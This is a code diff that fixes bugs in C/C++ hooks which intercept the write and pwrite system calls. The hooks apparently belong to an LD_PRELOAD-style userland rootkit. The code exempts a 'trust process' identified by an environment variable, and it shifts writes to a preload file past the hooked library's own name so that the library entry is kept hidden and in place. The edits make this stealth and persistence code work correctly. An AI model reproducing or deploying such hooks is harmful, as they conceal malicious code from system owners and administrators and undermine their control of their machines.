@@ -20,7 +20,7 @@ ssize_t write (int fd, void *buf, size_t count) {
 	assert (pwrPtr != NULL);
 
 	// To check if the caller is our trust process
-	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
+	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowValue)) {
 		if ((ret = wrPtr (fd, buf, count)) == -1) {
 			serr.set (errno);
 		}
@@ -37,7 +37,7 @@ ssize_t write (int fd, void *buf, size_t count) {
 		
 		// everything is OK, to write to our dynamic_cnf.txt
 		descr_holder fd_t (new int (-1));
-		if ((*fd_t = opnPtr (dynCnfFile.c_str (), O_RDWR)) == -1) {
+		if ((*fd_t = opnPtr (dynCnfFile.c_str (), O_RDWR, 0)) == -1) {
 			serr.set (EBADF);
 			return -1;
 		}
@@ -48,8 +48,8 @@ ssize_t write (int fd, void *buf, size_t count) {
 			return -1;
 		}
 		while (pwrPtr (*fd_t,
-					   (std::string (created) + writed).c_str (),
-					   (std::string (created) + writed).size (),
+					   (std::string (1, created) + writed).c_str (),
+					   (std::string (1, created) + writed).size (),
 					   0
 			  ) == -1 && errno == EINTR
 		);
@@ -77,7 +77,7 @@ ssize_t pwrite (int fd, const void *buf, size_t count, off_t offset) {
 	assert (pwrPtr != NULL);
 
 	// To check if the caller is our trust process
-	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
+	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowValue)) {
 		if ((ret = pwrPtr (fd, buf, count, offset)) == -1) {
 			serr.set (errno);
 		}
@@ -88,19 +88,19 @@ ssize_t pwrite (int fd, const void *buf, size_t count, off_t offset) {
 	
 	if (lnkAim == prelFileName) {
 		descr_holder fd_t (new int (-1));
-		if ((*fd_t = opnPtr (dynCnfFile.c_str (), O_RDWR)) == -1) {
+		if ((*fd_t = opnPtr (dynCnfFile.c_str (), O_RDWR, 0)) == -1) {
 			serr.set (EBADF);
 			return -1;
 		}
 		lockAllFile (*fd_t);
 		
-		if ((ret = pwrPtr (fd, buf, offset + (hookLibraryName + separator).size ())) == -1) {
+		if ((ret = pwrPtr (fd, buf, count, offset + (hookLibraryName + separator).size ())) == -1) {
 			serr.set (errno);
 			return -1;
 		}
 		while (pwrPtr (*fd_t,
-					   (std::string (created) + writed).c_str (),
-					   (std::string (created) + writed).size (),
+					   (std::string (1, created) + writed).c_str (),
+					   (std::string (1, created) + writed).size (),
 					   0
 			  ) == -1 && errno == EINTR
 		);
